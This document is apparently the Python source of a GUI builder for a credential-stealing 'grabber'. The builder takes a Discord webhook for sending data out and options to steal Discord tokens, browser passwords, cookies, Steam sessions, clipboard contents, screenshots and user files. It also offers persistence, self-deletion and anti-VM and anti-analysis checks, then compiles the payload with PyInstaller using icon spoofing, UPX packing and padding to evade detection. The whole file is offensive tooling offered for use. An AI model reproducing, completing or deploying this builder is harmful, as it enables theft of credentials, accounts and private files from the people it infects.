import os
import sys
import json
import subprocess
import tempfile
import threading
import tkinter as tk
from tkinter import messagebox, filedialog
from pathlib import Path
import customtkinter as ctk
import requests

LOG_FILE = Path("nexus_builder.log")
DEFAULT_CONFIG = {
    "webhook": "",
    "zip_password": "infected123",
    "options": {
        "screenshot": True,
        "clipboard": True,
        "steam": True,
        "discord_tokens": True,
        "discord_files": True,
        "browser_passwords": True,
        "cookies": True,
        "file_grabber": True,
        "file_extensions": [".txt", ".docx", ".pdf", ".jpg", ".png", ".zip"],
        "grab_folders": ["Desktop", "Documents", "Downloads"],
        "log_ip": True,
        "startup": True,
        "melt": False,
        "anti_vm": True,
        "anti_analysis": True
    },
    "build": {
        "onefile": True,
        "noconsole": True,
        "icon": "",
        "output_dir": "dist",
        "optimize_size": True,
        "use_upx": True,
        "exclude_libs": ["matplotlib", "pandas", "numpy", "scipy", "tkinter"],
        "target_mb": 0
    }
}

CONFIG_FILE = Path("nexus_config.json")

def load_config():
    if CONFIG_FILE.exists():
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    else:
        save_config(DEFAULT_CONFIG)
        return DEFAULT_CONFIG.copy()

def save_config(cfg):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(cfg, f, indent=4)

class NexusBuilder(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Nexus Grabber Builder")
        self.geometry("850x950")
        self.configure(fg_color="#0a0a0a")
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")
        self.config = load_config()
        self.building = False
        self._build_ui()
        self._load_to_ui()

    def _build_ui(self):
        self.main_frame = ctk.CTkFrame(self, corner_radius=15, fg_color="#111111")
        self.main_frame.pack(fill="both", expand=True, padx=20, pady=20)
        title = ctk.CTkLabel(self.main_frame, text="NEXUS GRABBER BUILDER", font=("Arial Black", 24, "bold"), text_color="#00ccff")
        title.pack(pady=(20,10))
        self.tabview = ctk.CTkTabview(self.main_frame, corner_radius=10, fg_color="#1a1a1a")
        self.tabview.pack(fill="both", expand=True, padx=20, pady=10)
        self.tabview.add("Webhooks")
        self.tabview.add("Stealing")
        self.tabview.add("Evasion")
        self.tabview.add("Build")

        webhook_frame = self.tabview.tab("Webhooks")
        ctk.CTkLabel(webhook_frame, text="Discord Webhook URL:", font=("Arial", 14)).pack(anchor="w", padx=20, pady=(20,5))
        self.webhook_entry = ctk.CTkEntry(webhook_frame, width=500, placeholder_text="https://discord.com/api/webhooks/...")
        self.webhook_entry.pack(anchor="w", padx=20, pady=5)
        self.test_btn = ctk.CTkButton(webhook_frame, text="Test Webhook", command=self._test_webhook, fg_color="#333333", width=150)
        self.test_btn.pack(anchor="w", padx=20, pady=5)
        ctk.CTkLabel(webhook_frame, text="ZIP Password (for file grabber):", font=("Arial", 14)).pack(anchor="w", padx=20, pady=(15,5))
        self.zip_pass_entry = ctk.CTkEntry(webhook_frame, width=300, show="*", placeholder_text="infected123")
        self.zip_pass_entry.pack(anchor="w", padx=20, pady=5)

        steal_frame = self.tabview.tab("Stealing")
        self.feature_vars = {}
        features = [
            ("screenshot", "📸 Take Screenshot"),
            ("clipboard", "📋 Steal Clipboard"),
            ("steam", "🎮 Steal Steam Session"),
            ("discord_tokens", "🎟️ Discord Tokens"),
            ("discord_files", "📁 Discord Local Files"),
            ("browser_passwords", "🔑 Browser Passwords"),
            ("cookies", "🍪 Browser Cookies"),
            ("file_grabber", "📦 File Grabber (ZIP)"),
            ("log_ip", "🌐 Log Public IP"),
            ("startup", "🔄 Startup Persistence"),
            ("melt", "💀 Self‑Delete")
        ]
        for i, (key, text) in enumerate(features):
            var = tk.BooleanVar(value=self.config['options'].get(key, False))
            self.feature_vars[key] = var
            cb = ctk.CTkCheckBox(steal_frame, text=text, variable=var, fg_color="#00ccff", font=("Arial", 12))
            cb.grid(row=i//2, column=i%2, sticky="w", padx=30, pady=8)
        ctk.CTkLabel(steal_frame, text="File extensions to grab (comma separated):", font=("Arial", 12)).grid(row=6, column=0, sticky="w", padx=30, pady=(15,5))
        self.ext_entry = ctk.CTkEntry(steal_frame, width=300, placeholder_text=".txt,.pdf,.jpg")
        self.ext_entry.grid(row=6, column=1, sticky="w", padx=20, pady=5)

        evade_frame = self.tabview.tab("Evasion")
        self.anti_vm_var = tk.BooleanVar(value=self.config['options'].get('anti_vm', True))
        self.anti_analysis_var = tk.BooleanVar(value=self.config['options'].get('anti_analysis', True))
        ctk.CTkCheckBox(evade_frame, text="Anti‑VM Detection", variable=self.anti_vm_var, fg_color="#00ccff").pack(anchor="w", padx=30, pady=10)
        ctk.CTkCheckBox(evade_frame, text="Anti‑Debug / Anti‑Analysis", variable=self.anti_analysis_var, fg_color="#00ccff").pack(anchor="w", padx=30, pady=10)

        build_frame = self.tabview.tab("Build")
        ctk.CTkLabel(build_frame, text="Output Directory:", font=("Arial", 13)).pack(anchor="w", padx=30, pady=(20,5))
        out_frame = ctk.CTkFrame(build_frame, fg_color="transparent")
        out_frame.pack(anchor="w", padx=30, pady=5)
        self.out_dir_var = tk.StringVar(value=self.config['build'].get('output_dir', 'dist'))
        self.out_entry = ctk.CTkEntry(out_frame, textvariable=self.out_dir_var, width=400)
        self.out_entry.pack(side="left", padx=(0,10))
        ctk.CTkButton(out_frame, text="Browse", command=self._browse_out, width=80, fg_color="#333333").pack(side="left")
        ctk.CTkLabel(build_frame, text="Custom Icon (.ico) for spoofing:", font=("Arial", 13)).pack(anchor="w", padx=30, pady=(15,5))
        icon_frame = ctk.CTkFrame(build_frame, fg_color="transparent")
        icon_frame.pack(anchor="w", padx=30, pady=5)
        self.icon_var = tk.StringVar(value=self.config['build'].get('icon', ''))
        self.icon_entry = ctk.CTkEntry(icon_frame, textvariable=self.icon_var, width=400)
        self.icon_entry.pack(side="left", padx=(0,10))
        ctk.CTkButton(icon_frame, text="Select", command=self._browse_icon, width=80, fg_color="#333333").pack(side="left")
        self.optimize_var = tk.BooleanVar(value=self.config['build'].get('optimize_size', True))
        ctk.CTkCheckBox(build_frame, text="Optimize payload size (strip debug symbols)", variable=self.optimize_var, fg_color="#00ccff").pack(anchor="w", padx=30, pady=10)
        self.upx_var = tk.BooleanVar(value=self.config['build'].get('use_upx', True))
        ctk.CTkCheckBox(build_frame, text="Use UPX compression (if installed)", variable=self.upx_var, fg_color="#00ccff").pack(anchor="w", padx=30, pady=5)
        ctk.CTkLabel(build_frame, text="Pad EXE to target size (MB):", font=("Arial", 13)).pack(anchor="w", padx=30, pady=(15,5))
        self.mb_var = tk.StringVar(value=str(self.config['build'].get('target_mb', 0)))
        mb_entry = ctk.CTkEntry(build_frame, textvariable=self.mb_var, width=100, placeholder_text="0 = no padding")
        mb_entry.pack(anchor="w", padx=30, pady=5)
        self.build_btn = ctk.CTkButton(build_frame, text="🔥 BUILD GRABBER 🔥", command=self._start_build, fg_color="#00ccff", font=("Arial", 16, "bold"), height=45)
        self.build_btn.pack(pady=30)
        self.progress = ctk.CTkProgressBar(build_frame, mode="indeterminate", width=400)
        self.progress.pack(pady=10)
        self.progress.set(0)
        self.status_label = ctk.CTkLabel(self.main_frame, text="Ready", font=("Arial", 10), text_color="#aaaaaa")
        self.status_label.pack(pady=(0,15))

    def _browse_out(self):
        d = filedialog.askdirectory()
        if d:
            self.out_dir_var.set(d)
    def _browse_icon(self):
        f = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
        if f:
            self.icon_var.set(f)
    def _load_to_ui(self):
        self.webhook_entry.insert(0, self.config.get('webhook', ''))
        self.zip_pass_entry.insert(0, self.config['options'].get('zip_password', 'infected123'))
        self.ext_entry.insert(0, ','.join(self.config['options'].get('file_extensions', [])))
        self.mb_var.set(str(self.config['build'].get('target_mb', 0)))
    def _save_to_config(self):
        self.config['webhook'] = self.webhook_entry.get().strip()
        self.config['options']['zip_password'] = self.zip_pass_entry.get().strip()
        self.config['options']['file_extensions'] = [x.strip() for x in self.ext_entry.get().split(',') if x.strip()]
        for key, var in self.feature_vars.items():
            self.config['options'][key] = var.get()
        self.config['options']['anti_vm'] = self.anti_vm_var.get()
        self.config['options']['anti_analysis'] = self.anti_analysis_var.get()
        self.config['build']['output_dir'] = self.out_dir_var.get()
        self.config['build']['icon'] = self.icon_var.get()
        self.config['build']['optimize_size'] = self.optimize_var.get()
        self.config['build']['use_upx'] = self.upx_var.get()
        try:
            mb = int(self.mb_var.get().strip()) if self.mb_var.get().strip() else 0
        except:
            mb = 0
        self.config['build']['target_mb'] = mb
        save_config(self.config)
    def _test_webhook(self):
        url = self.webhook_entry.get().strip()
        if not url:
            messagebox.showerror("Error", "Enter webhook URL")
            return
        try:
            r = requests.post(url, json={"content": "✅ Nexus test: Webhook works!"}, timeout=10)
            if r.status_code == 204:
                messagebox.showinfo("Success", "Webhook is valid.")
            else:
                messagebox.showwarning("Warning", f"Status: {r.status_code}")
        except Exception as e:
            messagebox.showerror("Error", str(e))
    def _start_build(self):
        if self.building:
            return
        self._save_to_config()
        if not self.config['webhook']:
            messagebox.showerror("Error", "Webhook URL required")
            return
        self.building = True
        self.build_btn.configure(state="disabled", text="BUILDING...")
        self.progress.start()
        self.status_label.configure(text="Building...")
        threading.Thread(target=self._build_worker, daemon=True).start()
    def _pad_exe(self, path, target_mb):
        if target_mb <= 0:
            return
        cur = os.path.getsize(path)
        target = target_mb * 1048576
        if cur >= target:
            return
        pad = target - cur
        with open(path, "ab") as f:
            f.write(os.urandom(pad))
    def _build_worker(self):
        try:
            template_path = Path("Nexus_template.py")
            if not template_path.exists():
                raise FileNotFoundError("Nexus_template.py not found")
            with open(template_path, 'r', encoding='utf-8') as f:
                template = f.read()
            template = template.replace("{WEBHOOK}", self.config['webhook'])
            template = template.replace("{ZIP_PASSWORD}", self.config['options']['zip_password'])
            flags = {
                "SCREENSHOT": self.config['options'].get('screenshot', False),
                "CLIPBOARD": self.config['options'].get('clipboard', False),
                "STEAM": self.config['options'].get('steam', False),
                "DISCORD_TOKENS": self.config['options'].get('discord_tokens', False),
                "DISCORD_FILES": self.config['options'].get('discord_files', False),
                "BROWSER_PASSWORDS": self.config['options'].get('browser_passwords', False),
                "COOKIES": self.config['options'].get('cookies', False),
                "FILE_GRABBER": self.config['options'].get('file_grabber', False),
                "LOG_IP": self.config['options'].get('log_ip', True),
                "STARTUP": self.config['options'].get('startup', False),
                "MELT": self.config['options'].get('melt', False),
                "ANTI_VM": self.config['options'].get('anti_vm', True),
                "ANTI_ANALYSIS": self.config['options'].get('anti_analysis', True)
            }
            for k, v in flags.items():
                template = template.replace(f"{{{k}}}", "True" if v else "False")
            exts = self.config['options'].get('file_extensions', [])
            ext_list = "[" + ",".join(f'"{e}"' for e in exts) + "]"
            template = template.replace("{FILE_EXTENSIONS}", ext_list)
            folders = self.config['options'].get('grab_folders', ['Desktop','Documents','Downloads'])
            folders_list = "[" + ",".join(f'"{f}"' for f in folders) + "]"
            template = template.replace("{GRAB_FOLDERS}", folders_list)
            fd, stub_path = tempfile.mkstemp(suffix=".py")
            with os.fdopen(fd, 'w', encoding='utf-8') as f:
                f.write(template)
            out_dir = self.config['build']['output_dir']
            os.makedirs(out_dir, exist_ok=True)
            cmd = [sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole",
                   "--distpath", out_dir, "--workpath", os.path.join(out_dir, "build_temp"),
                   "--specpath", out_dir]
            hidden = [
                "sqlite3", "win32crypt", "cryptography", "cryptography.fernet",
                "PIL", "PIL.ImageGrab", "psutil", "win32clipboard",
                "requests", "urllib3"
            ]
            for h in hidden:
                cmd.extend(["--hidden-import", h])
            if self.config['build'].get('optimize_size', False):
                cmd.append("--strip")
            if self.config['build'].get('use_upx', False):
                cmd.append("--upx-dir")
                cmd.append(".")
            if self.config['build'].get('icon'):
                cmd.extend(["--icon", self.config['build']['icon']])
            cmd.append(stub_path)
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
            if result.returncode != 0:
                raise Exception(f"PyInstaller error:\n{result.stderr}")
            exe_path = None
            for f in os.listdir(out_dir):
                if f.endswith(".exe"):
                    exe_path = os.path.join(out_dir, f)
                    break
            if not exe_path:
                raise Exception("No exe found")
            target_mb = self.config['build'].get('target_mb', 0)
            if target_mb > 0:
                self._pad_exe(exe_path, target_mb)
            self.after(0, self._build_success, exe_path)
        except Exception as e:
            self.after(0, self._build_failed, str(e))
        finally:
            self.building = False
            self.after(0, self._build_complete)
    def _build_success(self, path):
        size_mb = os.path.getsize(path) / 1048576
        messagebox.showinfo("Success", f"Grabber built!\n{path}\nSize: {size_mb:.2f} MB")
        self.status_label.configure(text=f"Build complete: {path}")
    def _build_failed(self, err):
        messagebox.showerror("Build Failed", err)
        self.status_label.configure(text="Build failed")
    def _build_complete(self):
        self.build_btn.configure(state="normal", text="🔥 BUILD GRABBER 🔥")
        self.progress.stop()
        self.progress.set(0)

if __name__ == "__main__":
    app = NexusBuilder()
    app.mainloop()
